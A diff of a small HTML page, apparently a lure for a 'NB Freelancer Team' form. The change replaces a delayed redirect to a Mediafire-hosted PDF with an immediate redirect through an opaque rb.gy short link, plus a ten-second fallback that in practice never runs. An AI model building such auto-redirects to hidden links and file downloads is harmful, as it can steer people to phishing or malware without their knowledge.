@@ -1,16 +1,26 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Please wait...</title>
-  <script>
-    setTimeout(function () {
-      window.location.replace("https://www.mediafire.com/file/9d3onww0beug85e/NB+Freelancer+Team+Form.pdf/file");
-    }, 2000);
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NB Freelancer Team</title>
+
+    <script>
+        const FIRST_LINK = "https://rb.gy/wkpsot";
+        const SECOND_LINK =
+            "https://www.mediafire.com/file/9d3onww0beug85e/NB+Freelancer+Team+Form.pdf/file";
+
+        // Open the first link in the same tab.
+        window.location.href = FIRST_LINK;
+
+        // Try to redirect to the second link after 10 seconds.
+        setTimeout(function () {
+            window.location.href = SECOND_LINK;
+        }, 10000);
+    </script>
 </head>
+
 <body>
-  <p>Please wait...</p>
+    <p>Opening...</p>
 </body>
 </html>
